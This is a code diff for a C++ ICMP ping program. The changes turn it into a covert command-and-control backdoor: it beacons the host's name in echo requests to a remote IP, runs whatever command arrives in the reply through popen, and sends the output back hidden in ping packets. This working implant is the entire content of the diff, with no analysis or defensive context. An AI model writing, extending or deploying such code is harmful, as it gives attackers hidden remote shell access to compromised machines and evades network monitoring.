@@ -1,5 +1,6 @@
 #include <iostream>
 #include <cstring>
+#include <cstdio>
 #include <string>
 #include <vector>
 #include <sstream>
@@ -81,15 +82,12 @@ long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
     icmp->icmp_code = 0;
     icmp->icmp_cksum = 0;
 
-    size_t hostname_len = strlen(hostname) + 1;
-    memcpy(&out[sizeof(icmphdr) + 4], hostname, hostname_len);
-
     if (buf && size > 0)
     {
-        memcpy(&out[sizeof(icmphdr) + 4 + hostname_len], buf, size);
+        memcpy(&out[sizeof(icmphdr) + 4], buf, size);
     }
 
-    icmp->icmp_cksum = htons(checksum(out, sizeof(icmphdr) + 4 + hostname_len + size));
+    icmp->icmp_cksum = htons(checksum(out, sizeof(icmphdr) + 4 + size));
 
     sockaddr_in addr_;
     addr_.sin_family = AF_INET;
@@ -97,7 +95,7 @@ long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
     addr_.sin_addr.s_addr = inet_addr(dst.c_str());
 
     long ret;
-    if ((ret = sendto(sockfd, out, sizeof(icmphdr) + 4 + hostname_len + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
+    if ((ret = sendto(sockfd, out, sizeof(icmphdr) + 4 + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1)
     {
         perror("sendto");
     }
@@ -123,12 +121,12 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
         {
             if (buf && size > 0)
             {
-                memcpy(buf, in + sizeof(ip) + sizeof(icmphdr), size);
+                memcpy(buf, in + sizeof(ip) + sizeof(icmphdr) + 4, ret - sizeof(ip) - sizeof(icmphdr) - 4);
             }
         }
     }
 
-    return ret;
+    return ret - sizeof(ip) - sizeof(icmphdr) - 4;
 }
 
 std::vector<std::string> split_input(std::string &input)
@@ -142,12 +140,34 @@ std::vector<std::string> split_input(std::string &input)
     return ret;
 }
 
-void parse_command(uint8_t *buf, size_t size)
+void parse_command(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
 {
     char *cmd_str_ = (char *)buf;
-    std::string cmd_str = cmd_str_;
+    std::string cmd_str(cmd_str_, size);
     auto split = split_input(cmd_str);
-    std::puts(split[0].c_str());
+
+    std::string command;
+    for (int i = 1; i < split.size(); i++)
+    {
+        command.append(split.at(i));
+    }
+
+    std::cout << "Running: " << command << "\n";
+    FILE *fp = popen(command.c_str(), "r");
+    uint8_t out[512];
+    if (fp == NULL)
+    {
+        return;
+    }
+
+    size_t nbytes;
+    do
+    {
+        nbytes = fread(out, 1, sizeof(out), fp);
+        send_ping(sockfd, dst, out, nbytes);
+    } while (nbytes == sizeof(out));
+
+    pclose(fp);
 }
 
 void usage(int exit_code)
@@ -186,15 +206,13 @@ int main(int argc, char **argv)
     while (1)
     {
         // Send a ICMP echo request.
-        send_ping(sockfd, dest_ip, NULL, 0);
+        size_t hostname_len = strlen(hostname) + 1;
+        send_ping(sockfd, dest_ip, (uint8_t *)hostname, hostname_len);
 
         uint8_t buf[1024];
         std::string src_ip;
         long nbytes = receive_ping(sockfd, src_ip, buf, sizeof(buf));
-        if (nbytes > 0)
-        {
-            std::cout << src_ip << "\n";
-        }
+        parse_command(sockfd, dest_ip, buf, nbytes);
 
         usleep(1000000);
     }
